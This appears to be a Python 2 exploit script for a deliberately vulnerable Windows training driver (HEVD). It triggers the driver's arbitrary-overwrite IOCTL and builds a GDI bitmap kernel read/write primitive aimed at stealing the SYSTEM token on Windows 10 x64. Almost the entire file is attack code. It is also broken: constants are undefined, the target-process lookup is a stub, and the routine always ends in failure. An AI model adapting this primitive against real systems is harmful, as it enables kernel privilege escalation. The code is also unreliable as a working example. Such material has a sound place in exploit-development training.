#!/usr/bin/python
#
# HackSysExtremeVulnerableDriver (HEVD) Windows x64 Kernel exploit
#       Arbitrary Overwrite via GDI SURFACE primitives
#
# Mariusz B. / mgeeky, '17
#

import os
import sys
import time
import struct
import ctypes
import platform
from ctypes.wintypes import *

# Driver's informations.
HEVD_FILE_NAME              = ur"\\.\HackSysExtremeVulnerableDriver"
IOCTL_CODE                  = 0x0022200b


# ----- SYSTEM VERSION DEPENDENT HADRCODED VALUES -----

# Valid for:
#   Windows 10 Kernel Version 1511 / 10586 MP (1 procs) Free x64
#   Built by: 10586.1106.amd64fre.th2_release.170904-1742
UNIQUE_PROCESS_ID           = 0x2e8
ACTIVE_PROC_LINKS           = 0x2f0         # _EPROCESS.ActiveProcessLinks
TOKEN_OFFSET                = 0x358         # _EPROCESS.Token

# STRUCTURES OFFSETS
PEB_GDI_SHARED_HANDLE_TABLE = 0x00f8

# Offset of pvScan0 member of the SURFACE64.SurfObj.pvScan0
OFFSET_TO_PVSCAN0           = 0x18 + 0x38

# ----- SYSTEM VERSION DEPENDENT HADRCODED VALUES -----


#
# Windows Structures and definitions
#

class _PEB(ctypes.Structure):
    _fields_ = [
        ('unrelated', BYTE * PEB_GDI_SHARED_HANDLE_TABLE),
        ('GdiSharedHandleTable', LPVOID),
    ]

class _PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('reserved1', LPVOID),
        ('PebBaseAddress', ctypes.POINTER(_PEB)),
        ('reserved2', LPVOID * 2),
        ('UniqueProcessId', ctypes.POINTER(ULONG)),
        ('reserved3', LPVOID)
    ]

class _GDICELL64(ctypes.Structure):
    _fields_ = [
        ('pKernelAddress', LPVOID),
        ('wProcessId', WORD),
        ('wCount', WORD),
        ('wUpper', WORD),
        ('wType', WORD),
        ('pUserAddress', LPVOID),
    ]

NtQueryInformationProcess = ctypes.windll.ntdll.NtQueryInformationProcess
NtQueryInformationProcess.restype = LONG
NtQueryInformationProcess.argtypes = (
    HANDLE,     # _In_      ProcessHandle
    ULONG,      # _In_      ProcessInformationClass
    LPVOID,     # _Out_     ProcessInformation
    ULONG,      # _In_      ProcessInformationLength
    ULONG       # _Out_opt_ ReturnLength
)


#
# Windows Constants
#
GENERIC_READ                = 0x80000000
FILE_SHARE_READ             = 1
FILE_SHARE_WRITE            = 2
OPEN_EXISTING               = 3
LANG_ENGLISH                = 9
SUBLANG_DEFAULT             = 1
FORMAT_MESSAGE_FROM_SYSTEM  = 0x00001000
FILE_ATTRIBUTE_NORMAL       = 0x00000080
FILE_FLAG_OVERLAPPED        = 0x40000000

ProcessBasicInformation     = 0


#
# Exploit Globals
#
gDriver = None


class Driver:
    fileName = ''

    def __init__(self, fileName):
        self.fileName = fileName

    def __exit__(self):
        if self.handle:
            ctypes.windll.kernel32.CloseHandle(self.handle)

    def open(self):
        self.handle = ctypes.windll.kernel32.CreateFileW(
            self.fileName,
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
            None
        )

        if not self.handle or self.handle == -1:
            print "[!] Could not open Driver's handle: " + formatError()
            return False

        print '[+] Driver: "{}" opened, handle: 0x{:04x}'.format(self.fileName, self.handle)
        return True

    def sendIoctl(self, ioctl, inpBuf, inputSize):
        ret = ctypes.c_ulong()
        inputBuf = getPtr(inpBuf)

        print '\t[+] Sending IOCTL: 0x{:08x}, input addr: 0x{:08x}, size: {}'.format(ioctl, inputBuf, inputSize)
        sys.stdout.flush()
        
        out = ctypes.windll.kernel32.DeviceIoControl(
            self.handle, 
            ioctl, 
            inputBuf, 
            inputSize, 
            None, 
            0, 
            ctypes.byref(ret), 
            None 
        )

        if not out:
            print '[!] IOCTL Failed: ' + formatError()

        return out

class GDIRing0Primitives():
    def __init__(self, callbackArbitraryOverwriteOnce):
        self.callbackArbitraryOverwriteOnce = callbackArbitraryOverwriteOnce
        self.pebAddress = 0
        self.gdiSharedHandleTable = LPVOID(0)

    def createBitmap(self, name):
        allocd = ctypes.windll.kernel32.VirtualAlloc(
            None,
            0x64 * 0x64 * 1,
            (MEM_COMMIT | MEM_RESERVE),
            PAGE_EXECUTE_READWRITE
        )

        ptr = ctypes.c_void_p(allocd)

        ctypes.windll.gdi32.CreateBitmap.restype = HANDLE
        hBitmap = ctypes.windll.gdi32.CreateBitmap(
            0x64,
            0x64,
            1,
            32,
            ctypes.byref(ptr)
        )

        out = ctypes.c_ulonglong(hBitmap)
        print '\t[.] Bitmap created ({}): hBitmap = 0x{:x}'.format(name, out.value)

        return hBitmap

    def obtainGdiSharedHandleTable(self):
        info = _PROCESS_BASIC_INFORMATION()
        status = NtQueryInformationProcess(
            HANDLE(-1),
            ProcessBasicInformation,
            ctypes.byref(info),
            ctypes.sizeof(info),
            0
        )

        if status < 0:
            print '[!] Could not fetch PEB!'
            sys.exit(-1)

        print '\t[+] PEB located at: 0x{:x}'.format(ctypes.addressof(info.PebBaseAddress.contents))
        peb = info.PebBaseAddress.contents

        self.gdiSharedHandleTable = peb.GdiSharedHandleTable
        print '\t[+] GdiSharedHandleTable at: 0x{:x}'.format(self.gdiSharedHandleTable)

    def createBitmaps(self):
        self.bitmapManager = self.createBitmap('Manager')
        self.bitmapWorker = self.createBitmap('Worker')

    def obtainPvScan0(self, name, hBitmap):
        cellAddr = self.gdiSharedHandleTable + (hBitmap & 0xffff) * ctypes.sizeof(_GDICELL64)
        cell = _GDICELL64.from_address(cellAddr)

        pvScan0 = cell.pKernelAddress + OFFSET_TO_PVSCAN0
        print '\t[+] {} bitmap (handle: ...{:04x}), pvScan0: 0x{:016x}'.format(name, (hBitmap & 0xffff), pvScan0)
        return pvScan0

    def fetchPvScans(self):
        self.managerPvScan0 = self.obtainPvScan0('Manager', self.bitmapManager)
        self.workerPvScan0 = self.obtainPvScan0('Worker', self.bitmapWorker)

    def overwriteManagerPvScan0(self):
        what = ctypes.c_ulonglong(self.workerPvScan0)
        where = self.managerPvScan0
        self.callbackArbitraryOverwriteOnce(ctypes.addressof(what), where)

    def setAddress(self, addr):
        addrToUse = LPVOID(addr)
        return 0 != ctypes.windll.gdi32.SetBitmapBits(
            self.bitmapManager,
            ctypes.sizeof(addrToUse),
            LPVOID(ctypes.addressof(addrToUse))
        )

    def arbitraryWrite(self, addr, src):
        if not self.setAddress(addr):
            print '[!] Arbitrary write failed at setting address: 0x{:x}'.format(addr)
            return False

        write = LPVOID(src)
        return 0 != ctypes.windll.gdi32.SetBitmapBits(
            self.bitmapWorker,
            ctypes.sizeof(LPVOID),
            LPVOID(ctypes.addressof(write))
        )

    def arbitraryRead(self, addr):
        if not self.setAddress(addr):
            print '[!] Arbitrary read failed at setting address: 0x{:x}'.format(addr)
            return False

        read = LPVOID()
        ret = ctypes.windll.gdi32.GetBitmapBits(
            self.bitmapWorker,
            ctypes.sizeof(LPVOID),
            LPVOID(ctypes.addressof(read))
        )

        if not ret:
            return False

        return read


def formatError():
    errCode = ctypes.windll.kernel32.GetLastError()
    buff = ctypes.create_string_buffer(1024)
    ctypes.windll.kernel32.FormatMessageA(
        FORMAT_MESSAGE_FROM_SYSTEM,
        0,
        errCode,
        (((SUBLANG_DEFAULT) << 10) | (LANG_ENGLISH)),
        buff,
        1024,
        0
    )

    return 'error: {!s}, {}'.format(errCode, repr(buff.value.strip()))

def getPtr(buf):
    return id(buf) + 32

def getKernelBase():
    imageBase = (ctypes.c_ulonglong * 1024)()
    cb = ctypes.c_uint32(1024)
    needed = ctypes.c_longlong()

    ctypes.windll.psapi.EnumDeviceDrivers.argtypes = \
        [ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_longlong)]
        
    res = ctypes.windll.psapi.EnumDeviceDrivers(
        ctypes.byref(imageBase),
        cb,
        ctypes.byref(needed)
    )
    if not res:
        print "\t[!] Failed getting kernel base: " + formatError()
        return None

    name = ctypes.create_string_buffer(256)
    ctypes.windll.psapi.GetDeviceDriverBaseNameA(
        LPVOID(imageBase[0]),
        ctypes.byref(name),
        256
    )

    print '\t[.] Acquired kernel base. {}: 0x{:x}'.format(name.value, imageBase[0])
    
    return imageBase[0], name.value

def triggerArbitraryOverwrite(what, where):
    class ArbitraryOverwriteStruct(ctypes.Structure):
        _fields_ = [
            ('what', LPVOID),
            ('where', LPVOID),
        ]

    obj = ArbitraryOverwriteStruct(what, where) 

    print '[+] Triggering only-once arbitrary overwrite...' 
    print '\tWhat:\t0x{:016x}'.format(what) 
    print '\tWhere:\t0x{:016x}'.format(where) 

    if gDriver.sendIoctl(IOCTL_CODE, ctypes.byref(obj), ctypes.sizeof(obj)):
        print '[.] It could have succeed.'
        return True

    print '[-] Exploit has failed.'
    return False

def getSystemProcess(primitive):
    system = None

    kernelBase, kernelName = getKernelBase()
    if not kernelBase:
        return None

    kernelModule = ctypes.windll.kernel32.LoadLibraryA(kernelName)
    if not kernelModule:
        print '[!] Could not load kernel module: {}'.format(kernelName)
        return None

    symbol = ctypes.windll.kernel32.GetProcAddress(
        kernelModule,
        "PsInitialSystemProcess"
    )

    PsInitialSystemProcess = symbol - kernelModule + kernelBase
    system = primitive.arbitraryRead(PsInitialSystemProcess)
    print '\t[.] SYSTEM _EPROCESS at: 0x{}'.format(system)

    return system

def getTargetProcess(primitive):
    target = 0
    


    return target

def collectEPROCESSes(primitive):
    system = getSystemProcess(primitive)
    target = getTargetProcess(primitive)

    return system, target

def exploit():

    primitive = GDIRing0Primitives(triggerArbitraryOverwrite)

    print '[>] Step 1: Locate GdiSharedHandleTable...'
    primitive.obtainGdiSharedHandleTable()

    print '[>] Step 2: Create two bitmaps: Manager and Worker...'
    primitive.createBitmaps()

    print '[>] Step 3: Obtain theirs SURFACE64.SurfObj.pvScan0...'
    primitive.fetchPvScans()

    print "[>] Step 4: Overwrite Manager's pvScan0 with address of Worker's pvScan0..."
    primitive.overwriteManagerPvScan0()

    print '\t[.] We now should have constructed Arbitrary Overwrite primitive.'
    print '[>] Step 5: Obtain SYSTEM\'s and target process _EPROCESSes:'
    system, target = collectEPROCESSes(primitive)
    if not system or not target:
        print '[!] Could not obtain needed EPROCESSes.'
        return False

    print '[-] Exploit has failed.'
    return False


def main(argv):
    global gDriver

    print '''
    HackSysExtremeVulnerableDriver
    Local Privilege Escalation exploit
        Arbitrary Overwrite via GDI SURFACEs (x64)
    Mariusz B. / mgeeky, '17
'''
    
    if platform.architecture()[0] != '64bit':
        raise Exception("This exploit must be run from Python 2.7 x64 bit")

    gDriver = Driver(HEVD_FILE_NAME)
    if not gDriver.open():
        return False

    return exploit()

if __name__ == '__main__':
    main(sys.argv)
